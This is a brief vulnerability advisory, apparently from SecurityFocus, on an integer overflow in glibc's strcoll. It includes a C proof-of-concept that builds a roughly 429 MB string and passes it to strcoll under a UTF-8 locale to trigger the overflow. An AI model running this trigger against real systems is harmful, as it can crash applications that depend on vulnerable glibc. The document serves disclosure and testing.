// source: https://www.securityfocus.com/bid/55462/info

GNU glibc is prone to a remote integer-overflow vulnerability which leads to buffer overflow vulnerability.

Successful exploits may allow an attacker to execute arbitrary code in the context of a user running an application that uses the affected library. Failed exploit attempts may crash the application, denying service to legitimate users.

#include <locale.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SIZE 429496730

int
main (void)
{
  char *p = malloc (1 + SIZE);
  if (setlocale (LC_COLLATE, "en_GB.UTF-8") == NULL)
    {
      puts ("setlocale failed, cannot test for overflow");
      return 0;
    }
  if (p == NULL)
    {
      puts ("malloc failed, cannot test for overflow");
      return 0;
    }
  memset (p, 'x', SIZE);
  p[SIZE] = 0;
  printf ("%d\n", strcoll (p, p));
  return 0;
}